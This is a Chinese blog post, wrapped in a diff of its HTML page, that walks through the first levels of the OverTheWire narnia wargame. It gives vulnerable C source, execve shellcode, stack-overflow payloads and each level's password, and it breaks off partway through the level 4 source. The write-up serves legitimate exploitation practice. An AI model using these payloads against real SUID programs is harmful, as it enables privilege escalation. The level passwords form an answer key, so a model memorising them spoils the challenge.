@@ -1,0 +1,1350 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="hgJm_NMToxnJSGCvEYC7x0VsU5DdYaEjpBAhqdc-eR8">
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/Or1onX.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Or1onX.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Or1onX.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/Or1onX.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="bin shellcode narnia,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Or1onX's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="前言 narnia 是 overthewire 上的一个二进制漏洞闯关游戏，总共有9个关卡平台上编译的二进制可执行文件没有开启 ASLR，关闭了 DEP 以及栈保护。该系列在 overthewire 上的难度系数是 2/10。 在通关结尾处作者提到如下作者想保证游戏的体验度，不希望大家把 writeup 公布出来，犹豫了好久，决定还是把解题过程放出来吧，一方面记录自己入坑二进制的过程，另一方面希望">
+<meta name="keywords" content="bin shellcode narnia">
+<meta property="og:type" content="article">
+<meta property="og:title" content="narnia writeup">
+<meta property="og:url" content="https://or1onx.github.io/narnia-writeup/index.html">
+<meta property="og:site_name" content="Or1onX&#39;s blog">
+<meta property="og:description" content="前言 narnia 是 overthewire 上的一个二进制漏洞闯关游戏，总共有9个关卡平台上编译的二进制可执行文件没有开启 ASLR，关闭了 DEP 以及栈保护。该系列在 overthewire 上的难度系数是 2/10。 在通关结尾处作者提到如下作者想保证游戏的体验度，不希望大家把 writeup 公布出来，犹豫了好久，决定还是把解题过程放出来吧，一方面记录自己入坑二进制的过程，另一方面希望">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmdzecterj20l40ddwnj.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmdr4rz6lj20oj05sad2.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fq7vy4e7swj20oh03p40l.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bgy1fq7w22ax9nj20oh049q5s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqa2l3s7sej20oj075dkv.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqa6y0f653j20om06yjwq.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqaa9mtrlhj20oc0pj7a9.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqaadsidkdj20oi01z0t5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqaaeuoyjfj20nv06n75s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqaaftdopej20mn04b3z6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bgy1fqbd3ortd9j20pf02zmxl.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bgy1fqbd451t2yj20ol06xn1o.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqbdpbl4t3j20oh074tdc.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqdraf29uyj20km03bq4y.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqdram043xj20mv03gwhd.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqdra32ntlj20oh04nae1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqj851k9gzj20op0dt7ey.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqj85rw37kj20ba02mmxt.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqj867k5bpj20jm0bewms.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqj86iujqrj20kt02575u.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqj86raargj20lf04bmzy.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqj87lcs5zj20oj04qjtz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqj87lcs5zj20oj04qjtz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqj92iamzaj20sc06hjxx.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmc3881t2j20km0e0wng.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmcig83msj20ng0awqf5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmck964b9j20np0di17v.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmcofkxfbj20og0cpdpe.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmctn2wukj20og08btdr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmdabq4aej20n102xjtd.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmde1o5elj20oi06i0y1.jpg">
+<meta property="og:updated_time" content="2018-05-04T10:44:38.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="narnia writeup">
+<meta name="twitter:description" content="前言 narnia 是 overthewire 上的一个二进制漏洞闯关游戏，总共有9个关卡平台上编译的二进制可执行文件没有开启 ASLR，关闭了 DEP 以及栈保护。该系列在 overthewire 上的难度系数是 2/10。 在通关结尾处作者提到如下作者想保证游戏的体验度，不希望大家把 writeup 公布出来，犹豫了好久，决定还是把解题过程放出来吧，一方面记录自己入坑二进制的过程，另一方面希望">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/a105112bly1fqmdzecterj20l40ddwnj.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://or1onx.github.io/narnia-writeup/">
+
+
+
+
+
+  <title>narnia writeup | Or1onX's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Or1onX's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://or1onx.github.io/narnia-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Or1onX">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Or1onX.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Or1onX's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">narnia writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-23T11:15:41+08:00">
+                2018-04-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span id="busuanzi_value_page_pv"></span>次阅读
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ol>
+<li>narnia 是 overthewire 上的一个二进制漏洞闯关游戏，总共有9个关卡<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqmdzecterj20l40ddwnj.jpg" alt><br>平台上编译的二进制可执行文件没有开启 ASLR，关闭了 DEP 以及栈保护。该系列在 overthewire 上的难度系数是 2/10。</li>
+<li>在通关结尾处作者提到如下<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqmdr4rz6lj20oj05sad2.jpg" alt><br>作者想保证游戏的体验度，不希望大家把 writeup 公布出来，犹豫了好久，决定还是把解题过程放出来吧，一方面记录自己入坑二进制的过程，另一方面希望能给其他同学一些参考。<a id="more"></a>
+<h1 id="level-1-narnia0-gt-narnia1"><a href="#level-1-narnia0-gt-narnia1" class="headerlink" title="level 1: narnia0 -&gt; narnia1"></a>level 1: narnia0 -&gt; narnia1</h1><h2 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val=<span class="number">0x41414141</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Here is your chance: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%24s"</span>,&amp;buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"buf: %s\n"</span>,buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"val: 0x%08x\n"</span>,val);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(val==<span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">        setreuid(geteuid(),geteuid());</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WAY OFF!!!!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li><p>根据源码可以知道是要覆盖 val 变量的值，以让 val 等于<code>0xdeadbeef</code>。但是需要注意一点的是小端序，即要把<code>\xef</code>放到低地址处</p>
+</li>
+<li><p>从结果看，应当执行成功了，但是没有正常返回 shell，原因是管道输出给程序后，就会自动关闭，导致 shell 无法正常打开<br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fq7vy4e7swj20oh03p40l.jpg" alt></p>
+</li>
+<li><p>这里修改一下 payload，可以看到成功执行：<br> <img src="http://ww1.sinaimg.cn/large/a105112bgy1fq7w22ax9nj20oh049q5s.jpg" alt></p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c <span class="string">'print "A" * 20 + "\xef\xbe\xad\xde"'</span>;cat) | ./narnia0</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><ul>
+<li><code>efeidiedae</code></li>
+</ul>
+<h1 id="level-2-narnia1-gt-narnia2"><a href="#level-2-narnia1-gt-narnia2" class="headerlink" title="level 2: narnia1 -&gt; narnia2"></a>level 2: narnia1 -&gt; narnia2</h1><h2 id="source-code-1"><a href="#source-code-1" class="headerlink" title="source code"></a>source code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> (*ret)();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(getenv(<span class="string">"EGG"</span>)==<span class="literal">NULL</span>)&#123;    </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Give me something to execute at the env-variable EGG\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Trying to execute EGG!\n"</span>);</span><br><span class="line">	ret = getenv(<span class="string">"EGG"</span>);</span><br><span class="line">	ret();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li><p>主程序首先声明一个函数指针<code>ret</code>，它会读取环境变量<code>EGG</code>的值并执行，因此，我们可以在 bash 中将<code>EGG</code>的值设成一个<code>shellcode</code></p>
+</li>
+<li><p>我们先用如下一段<code>shellcode</code>：</p>
+ <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span>    %eax,%eax</span><br><span class="line"><span class="keyword">push</span>   %eax</span><br><span class="line"><span class="keyword">push</span>   <span class="number">$0</span>x68732f2f <span class="comment">; //sh</span></span><br><span class="line"><span class="keyword">push</span>   <span class="number">$0</span>x6e69622f <span class="comment">; /bin</span></span><br><span class="line"><span class="keyword">mov</span>    %esp,%ebx</span><br><span class="line"><span class="keyword">mov</span>    %eax,%ecx</span><br><span class="line"><span class="keyword">mov</span>    %eax,%edx</span><br><span class="line"><span class="keyword">mov</span>    <span class="number">$0</span>xb,%al</span><br><span class="line"><span class="keyword">int</span>    <span class="number">$0</span>x80</span><br><span class="line"><span class="keyword">xor</span>    %eax,%eax</span><br><span class="line"><span class="keyword">inc</span>    %eax</span><br><span class="line"><span class="keyword">int</span>    <span class="number">$0</span>x80</span><br></pre></td></tr></table></figure>
+
+<p> 转换成操作码为：<br> <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</code><br> 结果如下：<br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqa2l3s7sej20oj075dkv.jpg" alt><br> 可以看到，只是执行<code>execve(&quot;/bin/sh&quot;)</code>的话仍是 narnia1 用户，不能得到 narnia2 的权限；好在程序设置了 <strong>SUID 标志位</strong>，参考上一题，我们需要执行<code>setreuid(geteuid(),geteuid());</code>，以让程序根据<code>narnia1</code>执行文件的 SUID 位将进程的 EUID 变为<code>narnia2</code></p>
+</li>
+<li><p>修改 shellcode<br>在之前的shellcode基础上加上如下部分</p>
+ <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">804841c:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">804841e:	b0 c9                	<span class="keyword">mov</span>    <span class="number">$0</span>xc9,%al</span><br><span class="line"><span class="number">8048420</span>:	cd <span class="number">80</span>                	<span class="keyword">int</span>    <span class="number">$0</span>x80</span><br><span class="line"><span class="number">8048422</span>:	<span class="number">89</span> c3                	<span class="keyword">mov</span>    %eax,%ebx</span><br><span class="line"><span class="number">8048424</span>:	<span class="number">89</span> c1                	<span class="keyword">mov</span>    %eax,%ecx</span><br><span class="line"><span class="number">8048426</span>:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line"><span class="number">8048428</span>:	b0 cb                	<span class="keyword">mov</span>    <span class="number">$0</span>xcb,%al</span><br><span class="line">804842a:	cd <span class="number">80</span>                	<span class="keyword">int</span>    <span class="number">$0</span>x80</span><br></pre></td></tr></table></figure>
+
+<p> 该部分的作用即为<code>setreuid(geteuid(),geteuid());</code></p>
+</li>
+<li><p>成功执行<br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqa6y0f653j20om06yjwq.jpg" alt></p>
+<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> EGG=`python -c <span class="string">'print "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'</span>`</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h2><ul>
+<li><code>nairiepecu</code></li>
+</ul>
+<h1 id="level-3-narnia2-gt-narnia3"><a href="#level-3-narnia2-gt-narnia3" class="headerlink" title="level 3: narnia2 -&gt; narnia3"></a>level 3: narnia2 -&gt; narnia3</h1><h2 id="source-code-2"><a href="#source-code-2" class="headerlink" title="source code"></a>source code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(argc == <span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Usage: %s argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s"</span>, buf);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li>这是段常见的栈溢出代码，只需要让<code>buf</code>溢出并将<code>main</code>函数的返回值覆盖为 shellcode 地址即可，下面需要进行两件事请，一是寻找<code>main</code>函数的返回地址位置相对于<code>buf</code>的偏移量，二是找出写进去的 shellcode 的地址</li>
+<li>找函数返回地址相对于<code>buf</code>的偏移量：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqaa9mtrlhj20oc0pj7a9.jpg" alt><br>通过暴力的二分法，我们得到返回地址（也可以借助于msf的测试字符串），<code>buf</code>位置与返回地址的位置相差140个字节。</li>
+<li>构造 payload，并找到其地址（我们借用上一题的 shellcode）：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqaadsidkdj20oi01z0t5.jpg" alt><br>随后在<code>gdb</code>中执行<code>x/250x $esp</code>，得到下列结果：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqaaeuoyjfj20nv06n75s.jpg" alt><br>找到 shellcode 的地址：<code>0xffffd7d5</code></li>
+<li>最终结果<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqaaftdopej20mn04b3z6.jpg" alt><br> 依然要注意，shellcode 的地址采用小端序<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./narnia2 `python -c <span class="string">'print "A" * 80 + "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 16 + "\xd5\xd7\xff\xff"'</span>`</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h2><ul>
+<li><code>vaequeezee</code></li>
+</ul>
+<h1 id="level-4-narnia3-gt-narnia4"><a href="#level-4-narnia3-gt-narnia4" class="headerlink" title="level 4: narnia3 -&gt; narnia4"></a>level 4: narnia3 -&gt; narnia4</h1><h2 id="source-code-3"><a href="#source-code-3" class="headerlink" title="source code"></a>source code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">int</span>  ifd,  ofd;</span><br><span class="line">        <span class="keyword">char</span> ofile[<span class="number">16</span>] = <span class="string">"/dev/null"</span>;</span><br><span class="line">        <span class="keyword">char</span> ifile[<span class="number">32</span>];</span><br><span class="line">        <span class="keyword">char</span> buf[<span 